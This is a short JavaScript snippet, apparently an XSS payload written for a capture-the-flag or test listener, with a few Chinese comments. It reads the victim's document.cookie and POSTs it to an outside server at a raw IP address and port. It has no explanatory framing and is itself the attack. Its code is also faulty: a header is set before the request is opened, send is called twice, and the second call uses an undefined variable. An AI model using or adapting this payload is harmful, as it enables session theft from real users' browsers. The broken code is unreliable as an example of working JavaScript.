let xhr = new XMLHttpRequest();
let xhrbody = "header=flag&listener=testmyxss&content=Hello. " + document.cookie;
xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
console.log(xhrbody);
xhr.open("post","http://39.101.137.200:7745/send");
xhr.send(xhrbody);

xhr.onreadystatechange = function () {
    if (xhr.readyState == 4 && xhr.status == 200) {  
        console.log(xhr.responseText);  // 接收数据
   }
}

xhr.send(body);
console.log(xhr.responseText);

xhr.onreadystatechange = function () {};  //清理事件响应函数(IE、火狐兼容性处理)
xhr.abort();

console.log("finished");
